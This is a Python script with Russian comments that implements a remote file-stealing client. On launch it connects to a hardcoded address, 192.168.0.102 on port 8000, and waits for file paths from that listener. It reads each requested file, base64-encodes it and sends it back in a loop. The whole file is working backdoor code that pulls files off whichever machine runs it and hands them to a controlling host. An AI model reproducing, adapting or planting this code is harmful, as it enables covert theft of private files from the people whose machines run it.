import socket
import json
import base64


class Client:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data: bytes) -> None:

        for chunk in (data[_:_+0xffff] for _ in range(0, len(data), 0xffff)):
            self.connection.send(len(chunk).to_bytes(2, "big")) # Отправляем длину куска (2 байта)
            self.connection.send(chunk) # Отправляем сам кусок
        self.connection.send(b"\x00\x00") # Обозначаем конец передачи куском нулевой длины

    def readexactly(self, bytes_count: int) -> bytes:

        b = b''
        while len(b) < bytes_count: # Пока не получили нужное количество байт
            part = self.connection.recv(bytes_count - len(b)) # Получаем оставшиеся байты
            if not part: # Если из сокета ничего не пришло, значит его закрыли с другой стороны
                raise IOError("Соединение потеряно")
            b += part
        return b

    def reliable_receive(self) -> bytes:
        b = b''
        while True:
            part_len = int.from_bytes(self.readexactly(2), "big") # Определяем длину ожидаемого куска
            if part_len == 0: # Если пришёл кусок нулевой длины, то приём окончен
                return b
            b += self.readexactly(part_len) # Считываем сам кусок 

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.encodebytes(file.read()).decode("utf-8")

    def run(self):
        while True:
            command = self.reliable_receive()
            command_result = self.read_file(command)

            self.reliable_send(command_result)


my_client = Client('192.168.0.102', 8000)
my_client.run()